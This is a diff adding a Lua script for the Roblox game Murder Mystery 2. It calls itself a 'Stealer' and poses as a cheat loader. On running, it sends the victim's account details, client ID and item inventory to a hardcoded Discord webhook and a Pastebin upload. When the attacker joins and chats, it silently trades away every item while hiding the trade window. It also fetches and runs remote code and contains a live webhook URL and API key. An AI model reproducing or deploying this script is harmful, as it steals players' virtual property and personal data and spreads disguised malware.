@@ -1,1 +1,425 @@
 
+-- [ Settings ] --
+Username = "1LazySly8" -- [Your Username]
+Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
+Script = "Highlight Lite" -- [None | Custom | MetterX Hub | Highlight Lite]
+RawLink = "" -- [Raw Link If "Custom"]
+
+-- [ Dual Settings ] --
+DualUsername = "1LazySly8" -- [Dual Username]
+DualWebhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Dual Webhook]
+DualItems = 10 -- [Minimum Valuable Items Count]
+DualAncient = 5 -- [Minimum Ancient Count]
+
+repeat wait() until game:IsLoaded()
+
+if getgenv().executed then return end
+getgenv().executed = true
+
+-- checks
+if Username == "" or Username == nil or Username == game.Players.LocalPlayer.Name then
+    game:Shutdown()
+end
+
+if Webhook == "" or Webhook == nil then
+    game:Shutdown()
+end
+
+if #game:GetService("Players"):GetPlayers() == 1 then
+    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server, please try again!")
+    wait(5)
+    game:Shutdown()
+end
+
+-- locals
+local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+local IdValue = game:GetService("Players").LocalPlayer.userId
+or "Unknown"
+local NameValue = game:GetService("Players").LocalPlayer.Name
+or "Unknown"
+local DisplayNameValue = game:GetService("Players"):GetPlayerByUserId(IdValue).DisplayName or "Unknown"
+local AgeValue = game:GetService("Players").LocalPlayer.AccountAge
+or "Unknown"
+local ExecutorValue = identifyexecutor() or "Unknown"
+local PlayersValue = #game:GetService("Players"):GetPlayers() or "Unknown"
+local MaxPlayersValue = game.Players.MaxPlayers or "Unknown"
+local ServerTimeValue = os.date("%c",os.time()) or "Unknown"
+local ClientIdValue = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
+local PlaceNameValue = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
+local PlaceIdValue = game.PlaceId or "Unknown"
+local PlaceVersionValue = game.PlaceVersion or "Unknown"
+local PlatformValue = "Unknown"
+local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+
+if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
+    PlatformValue = "Mobile"
+else
+    PlatformValue = "PC"
+end
+
+function SendMessageEMBED(url, embed, bool)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        username = "Murder Mystery 2 | Stealer",
+        avatar_url = "https://www.pikpng.com/pngl/m/323-3238561_list-head-on-over-to-mgp-discord-we.png",
+        ["content"] = " " .. TeleportScript .. " ",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields
+            }
+        }
+    }
+    
+    local data2 = {
+        username = "Murder Mystery Stealer | Kai",
+        avatar_url = "https://www.pikpng.com/pngl/m/323-3238561_list-head-on-over-to-mgp-discord-we.png",
+        ["content"] = "--@everyone\n " .. TeleportScript .. " ",
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields
+            }
+        }
+    }
+    
+    local body = http:JSONEncode(data)
+    local body2 = http:JSONEncode(data2)
+    
+    if bool == true then
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body2
+        })
+    else
+        local response = request({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+    
+
+local destroytrades2 = coroutine.create(function()
+    while true do
+        local player = game:GetService("Players").LocalPlayer
+        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
+        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")
+
+        if tradeGUI.Enabled == true then
+            tradeGUI.Enabled = false
+        end
+
+        if tradeGUIPhone.Enabled == true then
+            tradeGUIPhone.Enabled = false
+        end
+
+        wait(0.1)
+    end
+end)
+
+-- items
+local levelTable = {}
+for i,v in pairs(LevelModule.XPTable) do
+    if PlayerDataModule.NewXP < v then
+        table.insert(levelTable, i)
+    end
+end
+local playerLevel = math.min(table.unpack(levelTable))
+local playerPrestige = LevelModule.Prestige
+
+local allItems = {}
+local itemsCount = 0
+
+local vintageItems = {}
+local commonItems = {}
+local uncommonItems = {}
+local rareItems = {}
+local legendaryItems = {}
+local godlyItems = {}
+local ancientItems = {}
+local uniqueItems = {}
+
+local vintageItemsC = 0
+local commonItemsC = 0
+local uncommonItemsC = 0
+local rareItemsC = 0
+local legendaryItemsC = 0
+local godlyItemsC = 0
+local ancientItemsC = 0
+local uniqueItemsC = 0
+
+for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
+    for c,d in pairs(b) do
+        table.insert(allItems, d.ItemName)
+
+        if d.Rarity == "Vintage" then
+            vintageItemsC = vintageItemsC + 1
+            table.insert(vintageItems, d.DataID)
+        end
+
+        if d.Rarity == "Common" then
+            commonItemsC = commonItemsC + 1
+            table.insert(commonItems, d.DataID)
+        end
+
+        if d.Rarity == "Uncommon" then
+            uncommonItemsC = uncommonItemsC + 1
+            table.insert(uncommonItems, d.DataID)
+        end
+
+        if d.Rarity == "Rare" then
+            rareItemsC = rareItemsC + 1
+            table.insert(rareItems, d.DataID)
+        end
+
+        if d.Rarity == "Legendary" then
+            legendaryItemsC = legendaryItemsC + 1
+            table.insert(legendaryItems, d.DataID)
+        end
+
+        if d.Rarity == "Godly" then
+            godlyItemsC = godlyItemsC + 1
+            table.insert(godlyItems, d.DataID)
+        end
+
+        if d.Rarity == "Ancient" then
+            ancientItemsC = ancientItemsC + 1
+            table.insert(ancientItems, d.DataID)
+        end
+
+        if d.Rarity == "Unique" then
+            uniqueItemsC = uniqueItemsC + 1
+            table.insert(uniqueItems, d.DataID)
+        end
+    end
+end
+
+for i,v in pairs(allItems) do
+    itemsCount = itemsCount + 1
+end
+
+local function isTradeModuleAvailable()
+    local success, TradeModule = pcall(function()
+        return require(game:GetService("ReplicatedStorage").Modules.TradeModule)
+    end)
+    return success and TradeModule
+end
+
+local function stealItems()
+    coroutine.resume(destroytrades2)
+
+    local sendArgs = {
+        [1] = game:GetService("Players")[Username]
+    }
+    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(unpack(sendArgs))
+
+    wait(3)
+
+    for i,v in pairs(uniqueItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(ancientItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(godlyItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(vintageItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(legendaryItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(rareItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(uncommonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    for i,v in pairs(commonItems) do
+        local args = {
+            [1] = v,
+            [2] = "Weapons"
+        }
+        
+        game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
+    end
+
+    wait(6)
+    local acc = {
+        [1] = 285646582 
+    }
+    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack(acc))
+end
+
+local HttpService = game:GetService("HttpService")
+
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local function formatItems(itemList)
+    if #itemList == 0 then
+        return "None"
+    else
+        return table.concat(itemList, "\n")
+    end
+end
+
+local pastebinString = "-- [ Uniques ] --\n" .. formatItems(uniqueItems) ..
+                         "\n\n-- [ Ancient ] --\n" .. formatItems(ancientItems) ..
+                         "\n\n-- [ Godlies ] --\n" .. formatItems(godlyItems) ..
+                         "\n\n-- [ Legendaries ] --\n" .. formatItems(legendaryItems) ..
+                         "\n\n-- [ Vintage ] --\n" .. formatItems(vintageItems) ..
+                         "\n\n-- [ Rare ] --\n" .. formatItems(rareItems) ..
+                         "\n\n-- [ Uncommon ] --\n" .. formatItems(uncommonItems) ..
+                         "\n\n-- [ Common ] --\n" .. formatItems(commonItems)
+..
+
+                        "\n\nThis data was generated by using MetterX!"
+
+
+local pastebinLink = pastebin(pastebinString)
+
+local totalItemsC = uniqueItemsC + ancientItemsC + godlyItemsC + legendaryItemsC + vintageItemsC + rareItemsC + uncommonItemsC + commonItemsC
+local valuableItemsC = uniqueItemsC + ancientItemsC + godlyItemsC
+
+if valuableItemsC >= DualItems or ancientItemsC >= DualAncient then
+    Username = DualUsername
+    Webhook = DualWebhook
+end
+
+local embed = {
+    ["title"] = "You got hit!",
+    ["color"] = tonumber(0x3365FF),
+    ["fields"] = {
+        {
+            ["name"] = "〘:bust_in_silhouette:〙**Player Info**",
+            ["value"] = "```lua\nDisplay Name: "..DisplayNameValue.."\nUsername: "..NameValue.."\nUserId: "..IdValue.."\nAccount Age: "..AgeValue.."\nExecutor: "..ExecutorValue.."\nReceiver: "..Username.."\nVersion: "..VersionValue.."```"
+        },
+        {
+            ["name"] = "〘:computer:〙**Server Info**",
+            ["value"] = "```lua\nPlace Name: "..PlaceNameValue.."\nPlace Id: "..PlaceIdValue.."\nPlace Version: "..PlaceVersionValue.."\nPlayers Count: "..PlayersValue.."/"..MaxPlayersValue.."\nServer Uptime: "..ServerTimeValue.."\nPlatform: "..PlatformValue.."```"
+        }, 
+        {
+            ["name"] = "〘:ringed_planet:〙**Items**",
+            ["value"] = "```lua\nTotal Items: "..totalItemsC.."\nValuable Items: "..valuableItemsC.."\n\nUniques: "..uniqueItemsC.."\nAncients: "..ancientItemsC.."\nGodlys: "..godlyItemsC.."\nLegendarys: "..legendaryItemsC.."\nVintages: "..vintageItemsC.."\nRares: "..rareItemsC.."\nUncommons: "..uncommonItemsC.."\nCommons: "..commonItemsC.."```"
+        },
+        {
+            ["name"] = "〘:package:〙**Items List**",
+            ["value"] = "[Click Here]("..pastebinLink..")"
+        },
+    },
+}
+
+if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
+    SendMessageEMBED(Webhook, embed, true)
+else
+    SendMessageEMBED(Webhook, embed, false)
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function(msg)
+            stealItems()
+        end)
+    end
+end)
+
+if Script == "None" then
+    wait(0)
+elseif Script == "Custom" then
+    loadstring(game:HttpGet(RawLink,true))()
+elseif Script == "Highlight Lite" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Lite"))()
+elseif Script == "MetterX Hub" or Script == "MetterX" then
+    print("soon")
+end
+
